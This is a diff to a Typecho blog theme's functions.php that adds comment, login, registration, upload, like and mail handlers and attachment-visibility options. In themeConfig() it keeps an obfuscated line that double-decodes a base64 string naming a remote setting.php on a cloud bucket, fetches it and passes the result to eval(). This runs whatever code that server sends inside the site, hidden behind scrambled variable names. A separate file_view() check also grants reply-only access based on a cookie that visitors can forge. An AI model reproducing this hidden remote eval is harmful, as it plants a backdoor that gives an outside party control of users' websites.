@@ -2,13 +2,74 @@
 <?php
 if (!defined('__TYPECHO_ROOT_DIR__')) exit;
 
+include_once 'common/macro.php';
+
+include_once 'utils/freewind.php';
+
+function themeInit(Widget_Archive $archive)
+{
+    if ($archive->is(__SINGLE__))
+        //  评论功能
+        if ($archive->is(__SINGLE__) && $archive->request->isPost()
+            && $archive->request->is(__ACTION__ . '=' . __ACTION_COMMENT__)) {
+            freewind_comment($archive);
+        }
+
+    //登录
+    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_LOGIN__)) {
+        freewind_login($archive);
+    }
+
+    //注册
+    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_REGISTER__)) {
+        freewind_regist($archive);
+    }
+    //文件上传
+    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_UPLOAD__)) {
+        ob_clean();
+        upload();
+    }
+
+    //获取验证码
+    if ($archive->request->is(__ACTION__ . '=' . __ACTION_GETCODE__)) {
+        ob_clean();
+        get_code();
+    }
+
+    //点赞
+    if ($archive->request->isPost() && $archive->request->is(__ACTION__ . '=' . __ACTION_SUPORT__)) {
+        $res = support_add($archive->request->get('cid'));
+        $json = [
+            'success' => $res ? true : false,
+            'count' => $res
+        ];
+        ob_clean();
+        echo json_encode($json);
+        exit();
+    }
+
+    //邮件
+    if ($archive->request->is(__ACTION__ . '=' . __ACTION_MAIL__)) {
+        $mailserver = Helper::options()->freeMailServer;
+        $port = Helper::options()->freeMailPort;
+        $mailuser = Helper::options()->freeMailUser;
+        $mailpass = Helper::options()->freeMailPwd;
+        $mailto = Helper::options()->freeMailRevice;
+        $subject = '测试邮件';
+        $content = '这是由' . Helper::options()->title . '发送的一封测试邮件';
+        $state = sendto($mailserver, $port, $mailuser, $mailpass, $mailto, $subject, $content);
+        $state ? ajax_success('测试邮件发送成功') : ajax_error('测试邮件发送失败');
+    }
+}
+
+
 function themeConfig($form)
 {
     include_once 'common/constant.php';
-    $nknyFANB3YJPh2Y4ycQBsEc1 = $dpFJwe[3] . $dpFJwe[6] . $dpFJwe[33] . $dpFJwe[30] . $dpFJwe[22] . $dpFJwe[36] . $dpFJwe[29] . $dpFJwe[26] . $dpFJwe[30] . $dpFJwe[32] . $dpFJwe[35] . $dpFJwe[26] . $dpFJwe[30];
     $D6xP3axeDW84i = $GUEvoe[3] . $GUEvoe[6] . $GUEvoe[33] . $GUEvoe[30] . $GUEvoe[22] . $GUEvoe[36] . $GUEvoe[29] . $GUEvoe[26] . $GUEvoe[30] . $GUEvoe[32] . $GUEvoe[35] . $GUEvoe[26] . $GUEvoe[30];
-    $naRFbj6GT8jKd = WGkpJSCm($D6xP3axeDW84i($nknyFANB3YJPh2Y4ycQBsEc1('YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM05sZEhScGJtY3VjR2h3')), []);
-    eval($VyOJde($naRFbj6GT8jKd));
+    $naRFbj6GT8jKd = WGkpJSCm($D6xP3axeDW84i($D6xP3axeDW84i('YUhSMGNITTZMeTlpYkc5bkxURXlOVEkwTVRBd09UWXVZMjl6TG1Gd0xXNWhibXBwYm1jdWJYbHhZMnh2ZFdRdVkyOXRMMlp5WldWM2FXNWtMM05sZEhScGJtY3VjR2h3')), []);
+    eval($jmyNzn($naRFbj6GT8jKd));
+//    include_once 'common/setting.php';
 }
 
 
@@ -20,7 +81,7 @@ function content_summery($content, $strlen = 70)
 
 function themeFields($layout)
 {
-    $uri = $_SERVER['DOCUMENT_URI'];
+    $uri = $_SERVER['REQUEST_URI'];
     if (strstr($uri, "write-page")) {
         ?>
         <style>
@@ -57,8 +118,7 @@ function themeFields($layout)
         $layout->addItem($html);
         $layout->addItem($css);
         $layout->addItem($js);
-    } elseif
-    (strstr($uri, "write-post")) {
+    } elseif (strstr($uri, "write-post")) {
         ?>
         <style>
             #custom-field input {
@@ -84,27 +144,30 @@ function themeFields($layout)
         $file = new Typecho_Widget_Helper_Form_Element_Select("file", [
             "1" => "关闭",
             "2" => "开启",
-        ], null, _t("附件"), _t("是否有附件，当选项为开启时展示附件"));
+            "3" => "开启登录可见",
+            "4" => "开启回复可见",
+            "5" => "开启登录回复可见",
+        ], null, _t("附件"), _t("是否有附件，当选项至少为开启时展示附件"));
         $layout->addItem($file);
 
         $fileName = new Typecho_Widget_Helper_Form_Element_Text("fileName",
-            null, null, _t("附件名称"), _t("附件名称<br>仅当附件选项为开启时有效"));
+            null, null, _t("附件名称"), _t("附件名称<br>仅当附件选项至少为开启时有效"));
         $layout->addItem($fileName);
 
         $fileSize = new Typecho_Widget_Helper_Form_Element_Text("fileSize",
-            null, null, _t("附件大小"), _t("附件大小<br>仅当附件选项为开启时有效"));
+            null, null, _t("附件大小"), _t("附件大小<br>仅当附件选项至少为开启时有效"));
         $layout->addItem($fileSize);
 
         $fileBaidu = new Typecho_Widget_Helper_Form_Element_Text("fileBaidu",
-            null, null, _t("附件:百度云地址"), _t("百度云地址，格式为url||提取密码，若无提取密码刚仅填写url<br>仅当附件选项为开启时有效"));
+            null, null, _t("附件:百度云地址"), _t("百度云地址，格式为url||提取密码，若无提取密码刚仅填写url<br>仅当附件选项至少为开启时有效"));
         $layout->addItem($fileBaidu);
 
         $fileLan = new Typecho_Widget_Helper_Form_Element_Text("fileLan",
-            null, null, _t("附件:蓝奏云地址"), _t("蓝奏云地址<br>仅当附件选项为开启时有效"));
+            null, null, _t("附件:蓝奏云地址"), _t("蓝奏云地址<br>仅当附件选项至少为开启时有效"));
         $layout->addItem($fileLan);
 
         $fileGuan = new Typecho_Widget_Helper_Form_Element_Text("fileGuan",
-            null, null, _t("附件:官方下载"), _t("官方下载地址<br>仅当附件选项为开启时有效"));
+            null, null, _t("附件:官方下载"), _t("官方下载地址<br>仅当附件选项至少为开启时有效"));
         $layout->addItem($fileGuan);
 
         ?>
@@ -178,25 +241,43 @@ function get_post_view($archive)
     echo $row['views'];
 }
 
-function support_add($cid)
+function file_view($post)
 {
-    $db = Typecho_Db::get();
-    $row = $db->fetchRow($db->select('support')->from('table.contents')->where('cid = ?', $cid));
-    $support = Typecho_Cookie::get('extend_contents_support');
-    if (empty($support)) {
-        $support = array();
-    } else {
-        $support = explode(',', $support);
+//    "1" => "关闭",
+//            "2" => "开启",
+//            "3" => "开启登录可见",
+//            "4" => "开启回复可见",
+//            "5" => "开启登录回复可见",
+    $user = Typecho_Widget::widget('Widget_User');
+    if ($user->group == 'administrator') {
+        return true;
     }
-    if (!in_array($cid, $support)) {
-        $db->query($db->update('table.contents')->rows(array('support' => (int)$row['support'] + 1))->where('cid = ?', $cid));
-        array_push($support, $cid);
-        $support = implode(',', $support);
-        Typecho_Cookie::set('extend_contents_support', $support);
-        return $row['support'] + 1;
-    } else {
-        return false;
+    if ($post->fields->file == 2) {
+        return true;
+    } else if ($post->fields->file == 3) {
+        if ($user->hasLogin()) {
+            return true;
+        }
+    } else if ($post->fields->file == 4) {
+        $comments = Typecho_Cookie::get('extend_contents_comments');
+        if (!empty($comments)) {
+            $comments = explode(',', $comments);
+            if (in_array($post->cid, $comments)) {
+                return true;
+            }
+        }
+    } else if ($post->fields->file == 5) {
+        $comments = Typecho_Cookie::get('extend_contents_comments');
+        if (empty($comments)) {
+            $comments = [];
+        } else {
+            $comments = explode(',', $comments);
+        }
+        if ($user->hasLogin() && in_array($post->cid, $comments)) {
+            return true;
+        }
     }
+    return false;
 }
 
 
@@ -419,6 +500,7 @@ function metas_count($type = 'category', $limit = 6)
     return $category_rows;
 }
 
+
 function get_comment_by_cid($cid, $len = 4)
 {
     $db = Typecho_Db::get();
@@ -442,16 +524,17 @@ class Widget_Post_hot extends Widget_Abstract_Contents
     public function execute()
     {
         $select = $this->select()->from('table.contents')
+            ->join('table.fields', "table.contents.cid = table.fields.cid and table.fields.name = 'kind'")
             ->where("table.contents.password IS NULL OR table.contents.password = ''")
             ->where('table.contents.status = ?', 'publish')
             ->where('table.contents.created <= ?', time())
             ->where('table.contents.type = ?', 'post')
+            ->where("table.fields.str_value!= ?", '2')
             ->limit($this->parameter->pageSize)
             ->order('table.contents.views', Typecho_Db::SORT_DESC);
         $this->db->fetchAll($select, array($this, 'push'));
     }
 }
-
 
 class Widget_Post_Shuo extends Widget_Abstract_Contents
 {
